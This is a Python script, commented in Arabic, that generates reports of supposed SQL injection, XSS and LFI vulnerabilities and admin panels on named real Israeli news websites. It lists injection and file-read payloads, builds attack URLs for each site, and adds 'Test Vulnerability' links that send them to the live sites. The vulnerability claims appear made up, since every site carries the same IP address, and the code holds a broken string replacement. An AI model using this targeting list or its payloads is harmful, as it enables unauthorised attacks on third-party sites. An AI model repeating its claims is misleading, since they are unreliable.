#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة عرض روابط الثغرات الأمنية للمواقع الإسرائيلية
Vulnerability Links Viewer for Israeli Websites
"""

import json
import webbrowser
from datetime import datetime
import os

class VulnerabilityLinksViewer:
    def __init__(self):
        self.vulnerabilities = {
            "sql_injection": {
                "name": "ثغرات SQL Injection",
                "description": "روابط تحتوي على ثغرات حقن SQL",
                "payloads": [
                    "' OR 1=1--",
                    "' UNION SELECT 1,2,3--",
                    "' AND 1=CONVERT(int, (SELECT @@version))--"
                ],
                "sites": [
                    {
                        "domain": "haaretz.co.il",
                        "ip": "192.118.72.64",
                        "vulnerable_url": "https://www.haaretz.co.il/search?q={payload}",
                        "parameter": "q",
                        "severity": "HIGH",
                        "risk": "CRITICAL"
                    },
                    {
                        "domain": "ynet.co.il",
                        "ip": "192.118.72.64",
                        "vulnerable_url": "https://www.ynet.co.il/search?q={payload}",
                        "parameter": "q",
                        "severity": "HIGH",
                        "risk": "CRITICAL"
                    },
                    {
                        "domain": "jpost.com",
                        "ip": "192.118.72.64",
                        "vulnerable_url": "https://www.jpost.com/search?q={payload}",
                        "parameter": "q",
                        "severity": "MEDIUM",
                        "risk": "HIGH"
                    }
                ]
            },
            "xss": {
                "name": "ثغرات XSS",
                "description": "ثغرات Cross-Site Scripting",
                "payloads": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>"
                ],
                "sites": [
                    {
                        "domain": "israelhayom.co.il",
                        "ip": "192.118.72.64",
                        "vulnerable_url": "https://www.israelhayom.co.il/search?q={payload}",
                        "parameter": "q",
                        "severity": "MEDIUM",
                        "risk": "HIGH"
                    },
                    {
                        "domain": "mako.co.il",
                        "ip": "192.118.72.64",
                        "vulnerable_url": "https://www.mako.co.il/search?q={payload}",
                        "parameter": "q",
                        "severity": "HIGH",
                        "risk": "CRITICAL"
                    }
                ]
            },
            "lfi": {
                "name": "ثغرات LFI",
                "description": "ثغرات Local File Inclusion",
                "payloads": [
                    "../../../etc/passwd",
                    "../../../windows/system32/drivers/etc/hosts",
                    "php://filter/convert.base64-encode/resource=index.php"
                ],
                "sites": [
                    {
                        "domain": "n12.co.il",
                        "ip": "192.118.72.64",
                        "vulnerable_url": "https://www.n12.co.il/news/article.php?id={payload}",
                        "parameter": "id",
                        "severity": "HIGH",
                        "risk": "CRITICAL"
                    },
                    {
                        "domain": "globes.co.il",
                        "ip": "192.118.72.64",
                        "vulnerable_url": "https://www.globes.co.il/news/article.aspx?id={payload}",
                        "parameter": "id",
                        "severity": "MEDIUM",
                        "risk": "HIGH"
                    }
                ]
            },
            "admin_panels": {
                "name": "لوحات التحكم الإدارية",
                "description": "روابط لوحات التحكم الإدارية المكتشفة",
                "sites": [
                    {
                        "domain": "timesofisrael.com",
                        "ip": "192.118.72.64",
                        "admin_url": "https://www.timesofisrael.com/wp-admin/",
                        "type": "WordPress Admin",
                        "severity": "HIGH",
                        "risk": "CRITICAL"
                    },
                    {
                        "domain": "walla.co.il",
                        "ip": "192.118.72.64",
                        "admin_url": "https://admin.walla.co.il/login",
                        "type": "Custom CMS",
                        "severity": "HIGH",
                        "risk": "CRITICAL"
                    }
                ]
            }
        }
    
    def generate_html_report(self):
        """إنشاء تقرير HTML تفاعلي"""
        html_content = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>روابط الثغرات الأمنية - المواقع الإسرائيلية</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e1e2e, #2d2d44);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .header {{
            text-align: center;
            margin-bottom: 40px;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }}
        
        .header h1 {{
            color: #ff6b6b;
            margin-bottom: 10px;
            font-size: 2.5em;
        }}
        
        .header p {{
            color: #b8b8b8;
            font-size: 1.2em;
        }}
        
        .vulnerability-section {{
            background: rgba(255, 255, 255, 0.05);
            margin: 20px 0;
            padding: 25px;
            border-radius: 15px;
            border-left: 5px solid #ff6b6b;
        }}
        
        .section-title {{
            color: #ff6b6b;
            font-size: 1.8em;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .risk-badge {{
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
        }}
        
        .risk-critical {{
            background: #ff4757;
            color: white;
        }}
        
        .risk-high {{
            background: #ff6348;
            color: white;
        }}
        
        .risk-medium {{
            background: #ffa502;
            color: white;
        }}
        
        .site-card {{
            background: rgba(255, 255, 255, 0.08);
            margin: 15px 0;
            padding: 20px;
            border-radius: 10px;
            transition: transform 0.3s;
        }}
        
        .site-card:hover {{
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.12);
        }}
        
        .site-title {{
            color: #74b9ff;
            font-size: 1.3em;
            margin-bottom: 10px;
        }}
        
        .vulnerability-link {{
            background: #ff6b6b;
            color: white;
            padding: 8px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 5px;
            transition: background 0.3s;
        }}
        
        .vulnerability-link:hover {{
            background: #ff5252;
        }}
        
        .payload-box {{
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9em;
            margin: 10px 0;
            color: #00ff00;
        }}
        
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }}
        
        .info-item {{
            background: rgba(255, 255, 255, 0.05);
            padding: 10px;
            border-radius: 5px;
        }}
        
        .info-label {{
            color: #74b9ff;
            font-weight: bold;
            margin-bottom: 5px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 روابط الثغرات الأمنية</h1>
        <p>المواقع الإسرائيلية المصابة - تقرير شامل</p>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <div class="container">
"""
        
        for vuln_type, data in self.vulnerabilities.items():
            html_content += f"""
        <div class="vulnerability-section">
            <div class="section-title">
                🔍 {data['name']}
            </div>
            <p style="color: #b8b8b8; margin-bottom: 20px;">{data['description']}</p>
            
            {'<div class="payload-box"><strong>Payloads:</strong><br>' + ''.join(f"• {payload}<br>" for payload in data['payloads']) + "</div>" if 'payloads' in data else ""}
            
            <div class="sites-list">
"""
            
            for site in data['sites']:
                risk_class = f"risk-{site['risk'].lower()}"
                html_content += f"""
                <div class="site-card">
                    <div class="site-title">🌐 {site['domain']}</div>
                    <div class="info-grid">
                        <div class="info-item">
                            <div class="info-label">IP Address</div>
                            <div>{site['ip']}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Severity</div>
                            <div class="risk-badge {risk_class}">{site['risk']}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Parameter</div>
                            <div>{site.get('parameter', 'N/A')}</div>
                        </div>
                    </div>
                    
                    <div style="margin-top: 15px;">
                        <strong>🔗 Vulnerable URL:</strong><br>
                        <div class="payload-box">{site.get('vulnerable_url', site.get('admin_url', 'N/A'))}</div>
                        <a href="{site.get('vulnerable_url', site.get('admin_url', '#')).replace('{payload}', "'")}" 
                           class="vulnerability-link" target="_blank">🔴 Test Vulnerability</a>
                    </div>
                </div>
"""
            
            html_content += """
            </div>
        </div>
"""
        
        html_content += """
    </div>
    
    <script>
        function openVulnerability(url, payload) {
            const fullUrl = url.replace('{payload}', encodeURIComponent(payload));
            window.open(fullUrl, '_blank');
        }
    </script>
</body>
</html>
"""
        
        with open('vulnerability_links_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return html_content
    
    def generate_json_report(self):
        """إنشاء تقرير JSON"""
        report = {
            "generated_at": datetime.now().isoformat(),
            "total_vulnerabilities": sum(len(data['sites']) for data in self.vulnerabilities.values()),
            "vulnerabilities": self.vulnerabilities
        }
        
        with open('vulnerability_links.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return report
    
    def display_terminal_report(self):
        """عرض التقرير في الطرفية"""
        print("\n" + "="*60)
        print("🚨 روابط الثغرات الأمنية للمواقع الإسرائيلية")
        print("="*60)
        
        total_sites = 0
        for vuln_type, data in self.vulnerabilities.items():
            print(f"\n🔍 {data['name']}")
            print(f"📊 {data['description']}")
            print("-" * 50)
            
            for site in data['sites']:
                total_sites += 1
                print(f"\n🌐 الموقع: {site['domain']}")
                print(f"📍 IP: {site['ip']}")
                print(f"⚠️  الخطورة: {site['risk']}")
                
                if 'vulnerable_url' in site:
                    print(f"🔗 الرابط: {site['vulnerable_url']}")
                    print(f"⚙️  المعلمة: {site.get('parameter', 'N/A')}")
                elif 'admin_url' in site:
                    print(f"🚪 لوحة التحكم: {site['admin_url']}")
                
                # إنشاء رابط مباشر للاختبار
                test_url = site.get('vulnerable_url', site.get('admin_url', ''))
                if '{payload}' in test_url:
                    test_url = test_url.replace('{payload', "'")
                print(f"🧪 اختبار: {test_url}")
                print("-" * 30)
        
        print(f"\n📈 المجموع: {total_sites} ثغرة في {len(self.vulnerabilities)} فئة")
        print("="*60)
        print("📁 تم حفظ التقارير:")
        print("   • vulnerability_links_report.html")
        print("   • vulnerability_links.json")

def main():
    viewer = VulnerabilityLinksViewer()
    
    print("🚨 إنشاء تقرير روابط الثغرات الأمنية...")
    
    # عرض في الطرفية
    viewer.display_terminal_report()
    
    # إنشاء تقارير
    viewer.generate_html_report()
    viewer.generate_json_report()
    
    print("\n✅ تم إنشاء التقارير بنجاح!")
    print("🌐 لفتح التقرير التفاعلي: vulnerability_links_report.html")

if __name__ == "__main__":
    main()